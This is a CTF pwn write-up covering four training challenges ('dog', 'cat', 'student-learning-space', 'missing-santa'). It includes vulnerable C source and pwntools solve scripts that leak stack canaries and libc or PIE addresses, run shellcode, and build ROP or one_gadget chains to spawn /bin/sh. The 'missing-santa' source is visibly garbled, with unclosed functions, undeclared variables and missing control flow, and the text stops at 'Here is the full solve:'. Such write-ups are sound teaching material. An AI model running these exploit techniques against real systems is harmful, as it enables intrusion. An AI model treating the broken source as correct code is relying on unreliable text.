## Pwn - dog

::dist[Download challenge files]{file="iycep2026/pwn/dog/dist.zip"}

This challenge originally was intended to be rather easy, however my lack of reading of `redpwn/jail` documentation resulted in a harder than expected challenge. On the bright side, this made the challenge much more interesting to examine than initially planned, which was a nice touch I guess.

Here is the source code:

```c
//gcc -std=c99 -o dog main.c
#include <stdio.h>
#include <unistd.h>
#include <sys/mman.h>
#include <string.h>
#include <stdlib.h>

int server_conn() {
    // TOOD: Implement connection to woff-to-TTF converter
    printf("Connecting to woff-to-TTF converter...\n");
    printf("Unfortunately the service is currently unavailable...\n");
    return -1;
}

void read_font(char *woff) {
    char buffer[0x100];
    for (int i = 0; i < 3; i++) {
        puts("Enter your WOFF font in base64 form:");
        read(0, buffer, 0x200);
        strcpy(woff, buffer);
        printf("Here is the WOFF font you entered: %s\n", woff);
        if (server_conn() == 0) {
            puts("Successfully connected to the woff-to-TTF converter!");
            break;
        } else {
            puts("Failed to connect to the woff-to-TTF converter. Please try again.");
        }
    }
}

void setup() {
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stderr, NULL, _IONBF, 0);
}

int main() {
    setup();
    char *woff = mmap(NULL, 0x200, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
    puts("WOFF to TTF converter :D");
    if (getenv("DEBUG")) {
        printf("woff ptr: %p\n", woff);
    }
    read_font(woff);
    puts("Goodbye!");
    return 0;
}
```

Notice how off the bat we actually allocate a woff buffer using `mmap()`, with `rwx` permissions. This immediately suggests that some form of shellcoding is certainly possible for this challenge.

We also notice that we have a buffer overflow in `read_font()`, where we read out of bounds of our `0x100` buffer size. This allows us to do buffer overflow to redirect code execution.

However, taking a look at our binary, we notice that the binary has full protections:

```
❯ pwn checksec dog
[*] '/home/sherlock/Documents/CTF/authoring/iycep26/challenge-setting/pwn/training/dog/sol/dog'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

This means that we need to leak the canary in order to not fail the stack overflow check. I will not go into detail on how the canary works (you can read more over [here](https://book.jorianwoltjer.com/binary-exploitation/stack-canaries)), but the core idea is that the LSB of the canary is always a `NULL` byte, and hence by overwriting the null byte we are able to leak out the canary by preventing `strcpy()` from terminating.

Seeing as we already have a buffer overflow in `read_font()`, we are able to overflow the `NULL` byte and therefore leak the canary:

```python
r = conn()
payload = b"A" * 0x109
r.sendafter(b"form:\n", payload)
r.recvuntil(b"A" * 0x109)
canary = u64(b"\x00" + r.recvn(7))
info(f"canary: {hex(canary)}")
```

In order to jump to the shellcode written in `woff`, we must know where `mmap()` has allocated the memory for it. Taking a look at the code, we can see that the `woff` pointer is stored in the stack frame of `main()`, which should be located bellow the stack frame of `read_font()`. We can confirm this by looking at the stack in `gdb`:

![The woff pointer in main's stack frame](/images/ctf/iycep2026/woff_ptr_main.png)

Hence, if we write past the stack frame of `read_font()` into `main()`, we are able to leak the `woff` pointer, and thereby know where our shellcode is written to! Note that the canary check is only carried out when we exit `read_font()`, and since we have 3 opportunities to buffer overflow, as long as we restore the canary on our 3rd overflow we are safe.

```python
payload = b"A" * 0x129
r.sendafter(b"form:\n", payload)
r.recvuntil(b"A" * 0x129)
woff = u64((b"\x00" + r.recvn(5)).ljust(8, b"\x00") )
info(f"woff: {hex(woff)}")
```

Since we are relying on `strcpy()` to copy our shellcode to the `woff` pointer address, we must make sure that it is null-free. Luckily for us, `shellcraft` provides us with shellcode that is already null-free. Hence, we can send our shellcode with our rip overwrite together:

```python
payload = asm(shellcraft.sh())
payload += b"A" * (0x108 - len(payload))
payload += p64(canary)
payload += b"B" * 0x8
payload += p64(woff)
info(f"payload: {payload}")
r.sendafter(b"form:\n", payload)
```

And voila! We get a shell! Here is the full solve script for reference:

```python
#!/usr/bin/env python3

from pwn import *

exe = ELF("./dog_patched")
libc = ELF("libc")
ld = ELF("ld")

context.binary = exe
context.terminal = ["zellij", "action", "new-pane", "--"]

gdbscript = """
set disable-randomization off
set breakpoint pending on
b *read_font+92
continue
"""


def conn():
    if args.LOCAL:
        r = process([exe.path], stdin=PTY, stdout=PTY)
        if args.GDB:
            gdb.attach(r, gdbscript=gdbscript)
            pause()
    else:
        r = remote("addr", 1337)

    return r


def main():
    r = conn()
    payload = b"A" * 0x109
    r.sendafter(b"form:\n", payload)
    r.recvuntil(b"A" * 0x109)
    canary = u64(b"\x00" + r.recvn(7))
    info(f"canary: {hex(canary)}")

    payload = b"A" * 0x129
    r.sendafter(b"form:\n", payload)
    r.recvuntil(b"A" * 0x129)
    woff = u64((b"\x00" + r.recvn(5)).ljust(8, b"\x00") )
    info(f"woff: {hex(woff)}")

    payload = asm(shellcraft.sh())
    payload += b"A" * (0x108 - len(payload))
    payload += p64(canary)
    payload += b"B" * 0x8
    payload += p64(woff)
    info(f"payload: {payload}")
    r.sendafter(b"form:\n", payload)
    r.interactive()


if __name__ == "__main__":
    main()
```

## Pwn - cat (day 1 homework)

::dist[Download challenge files]{file="iycep2026/pwn/cat/dist.zip"}

Having already taught how we can overwrite the saved `$rip` on the stack, I wanted to stretch the participants' understanding further and see if they can deduce the ability to overwrite the saved `$rbp` too. With that in mind, I began setting the 2nd homework for day 1, cat.

Here is the source code:

```c
//gcc -std=c99 -fno-stack-protector -o cat main.c
#include <stdio.h>
#include <unistd.h>
#include <string.h>
#include <dlfcn.h>

void cat() {
    char scolding[0x20];
    printf("This cat loves to play with balls :D\n");
    printf("Oh no the cat is naughty and has found the atoi address: %p\n", dlsym(RTLD_DEFAULT, "atoi"));
    printf("Do something to stop the cat!\n");
    //Sometimes you need to scold the cat a bit more ugwim
    fgets(scolding, 0x38, stdin);
}

void setup() {
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stderr, NULL, _IONBF, 0);
}

int main() {
    setup();
    cat();
    return 0;
}
```

We immediately notice that there is a buffer overflow in `cat()`, where we get `0x18` bytes of overflow. With such little space to overwrite, the obvious solution to this is to use a onegadget. Given that `atoi()` is already leaked by the program, this makes this solution much more probable.

Given that this challenge uses glibc 2.39, here are the onegadgets that we have available:

```
0x583ec posix_spawn(rsp+0xc, "/bin/sh", 0, rbx, rsp+0x50, environ)
constraints:
  address rsp+0x68 is writable
  rsp & 0xf == 0
  rax == NULL || {"sh", rax, rip+0x17301e, r12, ...} is a valid argv
  rbx == NULL || (u16)[rbx] == NULL

0x583f3 posix_spawn(rsp+0xc, "/bin/sh", 0, rbx, rsp+0x50, environ)
constraints:
  address rsp+0x68 is writable
  rsp & 0xf == 0
  rcx == NULL || {rcx, rax, rip+0x17301e, r12, ...} is a valid argv
  rbx == NULL || (u16)[rbx] == NULL

0xef4ce execve("/bin/sh", rbp-0x50, r12)
constraints:
  address rbp-0x48 is writable
  rbx == NULL || {"/bin/sh", rbx, NULL} is a valid argv
  [r12] == NULL || r12 == NULL || r12 is a valid envp

0xef52b execve("/bin/sh", rbp-0x50, [rbp-0x78])
constraints:
  address rbp-0x50 is writable
  rax == NULL || {"/bin/sh", rax, NULL} is a valid argv
  [[rbp-0x78]] == NULL || [rbp-0x78] == NULL || [rbp-0x78] is a valid envp
```

Not many that we can use. Trying all the onegadgets on their own, we realise that none of them directly provide us a shell.

But taking a closer look at the constraints, maybe `0xef52b` is possible. We just need to be able to set `$rdp-0x50` and `rdp-0x70` to somewhere that points to null bytes. But how can we set `$rbp` in the first place?

If you were to have a look at the function prologue, before every `ret` instruction is a `leave` instruction.

![The leave instruction in the function epilogue](/images/ctf/iycep2026/leave.png)

We can consider `leave` to do the following:

```asm
mov rsp, rbp
pop rbp
```

See how we are popping `$rbp` off the stack? That means, on our stack, before our saved `$rip`, there is actually a saved `$rsp` address! Since this saved address is directly after our buffer, we are able to reach and overwrite it with our `0x18` bytes of overflow. Now, we just need to find a place with a lot of null bytes to point it to. But hmm, where in a binary has many null bytes?

If you had done a bit of googling, you would realise that the answer to this question is the `.bss` section of a binary, specifically here in libc. If we throw libc into a decompiler like Binary Ninja and inspect its `.bss` segment...

![The zero-filled libc BSS section](/images/ctf/iycep2026/libc-bss.png)

We notice that it is filled with `0x00`s! That means, if we overwrite the saved `$rbp` on the stack to point to libc `.bss`, as well as the saved `$rip` to point to our `0xef52b` gadget, we are able to pop a shell with only `0x10` bytes of overwrite!

Hence, we can calculate the libc base by subtracting the leaked `atoi()` pointer from its offset, yielding this solve script:

```python
#!/usr/bin/env python3

from pwn import *

exe = ELF("./cat_patched")
libc = ELF("libc")
ld = ELF("ld")

context.binary = exe
context.terminal = ["zellij", "action", "new-pane", "--"]

gdbscript = """
set breakpoint pending on
b *main
continue
"""


def conn():
    if args.LOCAL:
        r = process([exe.path], stdin=PTY, stdout=PTY)
        if args.GDB:
            gdb.attach(r, gdbscript=gdbscript)
            pause()
    else:
        r = remote("addr", 1337)

    return r


def main():
    r = conn()

    r.recvuntil(b"address: ")
    leak = int(r.recvline().strip(), 16) - libc.sym["atoi"]
    info(f"Leaked libc base address: {hex(leak)}")
    payload = b"A" * 0x20
    payload += p64(leak + libc.bss() + 0x200)
    payload += p64(leak + 0xEF52B)
    r.sendlineafter(b"!", payload)

    r.interactive()


if __name__ == "__main__":
    main()
```

However, if we were to actually run this, we would see the following:

![The shell rejecting the payload as an invalid argument](/images/ctf/iycep2026/args.png)

This is because our payload, actually (if you trace through the control flow in gdb), is being used as an argument for `/bin/sh`! Hence, we need to start the payload with a valid flag for `/bin/sh`, of which here I am using `/bin/sh -p`:

```python
#!/usr/bin/env python3

from pwn import *

exe = ELF("./cat_patched")
libc = ELF("libc")
ld = ELF("ld")

context.binary = exe
context.terminal = ["zellij", "action", "new-pane", "--"]

gdbscript = """
set breakpoint pending on
b *main
continue
"""


def conn():
    if args.LOCAL:
        r = process([exe.path], stdin=PTY, stdout=PTY)
        if args.GDB:
            gdb.attach(r, gdbscript=gdbscript)
            pause()
    else:
        r = remote("addr", 1337)

    return r


def main():
    r = conn()

    r.recvuntil(b"address: ")
    leak = int(r.recvline().strip(), 16) - libc.sym["atoi"]
    info(f"Leaked libc base address: {hex(leak)}")
    payload = b"-p\x00".ljust(0x20, b"A")
    payload += p64(leak + libc.bss() + 0x200)
    payload += p64(leak + 0xEF52B)
    r.sendlineafter(b"!", payload)

    r.interactive()


if __name__ == "__main__":
    main()
```

And yay! We get a shell!

## Pwn - student-learning-space

::dist[Download challenge files]{file="iycep2026/pwn/student-learning-space/dist.zip"}

Here is the source code:

```c
// gcc -std=c99 -fno-stack-protector -Wl,-z,relro,-z,now,-z,noexecstack -o student-learning-space main.c
#include <stdio.h>
#include <unistd.h>

void setup() {
  setvbuf(stdout, NULL, _IONBF, 0);
  setvbuf(stdin, NULL, _IONBF, 0);
  setvbuf(stderr, NULL, _IONBF, 0);
}

void debug_shell(char *const prog, char *const *argv, char *const *envp) {
  puts("Here is your debug shell!\n");
  execve(prog, argv, envp);
}

void sls() {
  char buf[0x100];
  puts("Thank you for trying out our beta version of the Student Learning "
       "Space!");
  puts("We are currently in the process of developing this platform, and we "
       "appreciate your feedback.");
  printf("If you ever need to drop down to a debug shell in order to diagnose "
         "an issue, it can be found here: %p\n",
         debug_shell);
  puts("Our debug shell runs the best shell program: /bin/sh");
  printf("\n");
  puts("We have created an AI assistant to help you with your learning, called "
       "SLAI (pronounced sly).");
  puts("SLAI is designed to provide you with personalized learning experiences "
       "and support your academic journey.");
  puts("We hope you enjoy using SLAI and find it helpful in your studies!");
  printf("\n");
  puts("What do you want to learn from SLAI today?");
  // Need to do user testing to see how long prompt is to allocate buffer
  gets(buf);
}

int main() {
  setup();
  sls();
  return 0;
}

// I am tired of being constrained by Christmas merry christmas beta testers!
void gifts() { __asm__("pop %rdi; ret; pop %rsi; ret; pop %rdx; ret"); }
```

We immediately see that there is a buffer overflow in `sls()`, and that `debug_shell()` has been kindly provided to us to pop a shell!

Running `checksec`:

```
❯ pwn checksec student-learning-space
[*] '/home/sherlock/Documents/CTF/authoring/iycep26/challenge-setting/pwn/student-learning-space/sol/student-learning-space'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        PIE enabled
    Stripped:   No
```

Immediately off the bat, we can see that there is no canary, allowing us to easily buffer overflow to redirect control flow. However, PIE is enabled, meaning that we need to leak an address before knowing where the binary has been loaded.

We also note that `debug_shell()` takes in 3 arguments for `execve()`, meaning we need to set up the arguments to call shell by ourselves. Thankfully, we can use Return-Oriented Programming to help us set up the arguments for our shell.

Running our binary through `ROPgadget`, we see the following few gadgets of interest:

```
0x0000000000001302 : pop rdi ; ret
0x0000000000001304 : pop rsi ; ret
0x0000000000001306 : pop rdx ; ret
```

If we recall the x84-64 calling convention, our first argument (`prog`) is placed in to `rdi`, our second argument (`argv`) is placed into `rsi`, and our third argument (`envp`) is placed into `rdx`. By referencing the [linux manpages](https://man7.org/linux/man-pages/man2/execve.2.html), we can come to the conclusion that we need to put a pointer to `/bin/sh` in `prog`, and set both `argv` and `envp` to `null` (i.e. `0x0`). These gadgets allow us to pop our custom values off the stack and into the registers, setting up the state for us to pop a shell.

But how do we get a pointer to `/bin/sh`? If we take a look in our binary, we notice that `/bin/sh` is actually printed out in a `puts()` call! In order to print it out, that means our program must be storing a `/bin/sh\x00` null-terminated string somewhere in memory, at an offset from where our binary is loaded (For those interested, the string is stored in the `.data` segment of the ELF). That means, once we know the base address at which the binary is loaded to, we can find the address at which `/bin/sh\x00` exists in our binary, and therefore put the pointer to the start of that string as our `prog`!

The program nicely leaks us the address of `debug_shell()`, so with that information we can find the PIE base of the binary and calculate the addresses of the gadgets we need to call, as well as the location of `/bin/sh\x00` in the binary.

In a nutshell, we want to do the following:
- Leak the PIE base by reading the `debug_shell()` address
- Calculate the addresses of the ROP gadgets and `/bin/sh\x00` in memory
- Construct a ROP chain to set up our arguments to call `/bin/sh`;
- Call `debug_shell()` with our new arguments set up to execute `/bin/sh`!

Here is the solve:

```python
#!/usr/bin/env python3

from pwn import *

exe = ELF("./student-learning-space_patched")
libc = ELF("libc")
ld = ELF("ld")

context.binary = exe

gdbscript = """
set breakpoint pending on
b *main
continue
"""


def conn():
    if args.LOCAL:
        r = process([exe.path], stdin=PTY, stdout=PTY)
        if args.GDB:
            gdb.attach(r, gdbscript=gdbscript)
            pause()
    else:
        r = remote("localhost", 50001)

    return r


def main():
    r = conn()
    payload = b"A" * 0x108
    r.recvuntil(b"here: ")
    leak = int(r.recvline().strip(), 16) - exe.sym["debug_shell"]
    pop_rdi = leak + 0x0000000000001302
    pop_rsi = leak + 0x0000000000001304
    pop_rdx = leak + 0x0000000000001306
    bin_sh = leak +  next(exe.search(b"/bin/sh\x00"))
    payload += flat(
        pop_rdi,
        bin_sh,
        pop_rsi,
        0,
        pop_rdx,
        0,
        leak + exe.sym["debug_shell"], # Actually can directly ret to execve plt or debug_shell both work but debug_shell is intended
    )
    r.sendlineafter(b"?\n", payload)
    r.interactive()


if __name__ == "__main__":
    main()
```

## Pwn - missing-santa

::dist[Download challenge files]{file="iycep2026/pwn/missing-santa/dist.zip"}

Here is the source code:

```c
// gcc -std=c99 -fno-stack-protector -fno-pie -no-pie -Wl,-z,relro,-z,now,-z,noexecstack -o missing-santa main.c
#include <stdio.h>
#include <unistd.h>

void setup() {
  setvbuf(stdout, NULL, _IONBF, 0);

void tis_the_season_of_gifting_fa_la_la_la_la_la_la_la_la() {

    printf("Deck the halls with boughs of holly, fa la la la la la la la la\n");
    printf("but where are my gifts???\n");
    printf("Enter your gift:\n>");
    fgets(buf, 0x100, stdin);
}

void menu(){
    printf("1. Give gifts!\n");
    printf("2. View Santa's debuginfo\n");
    printf("> ");
}

void debuginfo() {
    printf("Santa's debuginfo: \n");
    printf("What address do you want to inspect?\n");
    printf("> ");
    char *address;
    scanf("%p", &address);
    getchar();

int main() {

      menu();
      char choice;
      choice = getchar();

          tis_the_season_of_gifting_fa_la_la_la_la_la_la_la_la();
      } else if (choice == '2') {
          debuginfo();
      }
  }
  return 0;
}

//??? WHERE ARE MY GIFTS???
```

We are presented with a menu with 2 choices: to either send a gift or to view the data at any given address via the debuginfo. No win function, so we need to ROP our way to a shell.

```
pwn/missing-santa/sol via  v16.2.1-gcc via  v3.14.7
❯ pwn checksec missing-santa
[*] '/home/sherlock/Documents/CTF/authoring/iycep26/challenge-setting/pwn/missing-santa/sol/missing-santa'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

We notice that there is no PIE and no canary, which is quite cool. This means that we know where our binary is loaded to, allowing us to directly reference the addresses in our exploit. In our binary, there is this thing called the Global Offset Table (GOT) that stores the addresses of external library functions (such as libc). If we send in the address of the GOT entry for a known libc function, we can thereby get its address and calculate where libc is loaded in our memory space (recall that libc is affected by ASLR).

Hence, we can leak the libc base by leaking the GOT:

```python
r.sendlineafter(b"> ", str(2).encode())
r.sendlineafter(b"> ", b"0x000000403fe0")
r.recvuntil(b": ")
leak = u64(r.recvn(6).ljust(8, b"\x00")) - libc.sym["setvbuf"]
info(f"Libc base: {hex(leak)}")
```

Note that we chose `setvbuf()` instead of `printf()`, because the least significant byte of `printf()`'s address is a null byte, which would be terminated by the format specifier `%s` used by `printf()`.

Then, we can use the binary instructions in libc to do ROP, and give us the shell! Because the string `/bin/sh\x00` exists within the libc binary itself, we can therefore calculate its address with the libc address leak and pass it in as an argument to `system()`. Note the extra `ret` gadget used to make sure our stack is 16-byte aligned.

```python
libc_pop_rdi_ret = leak + 0x000000000010f78b
libc_ret = leak + 0x000000000002882f
payload = flat(
	b"A" * 0x28,
	libc_ret,
	libc_pop_rdi_ret,
	leak + next(libc.search(b"/bin/sh\x00")),
	leak + libc.sym["system"],
)
r.sendlineafter(b">", payload)
```

Here is the full solve:
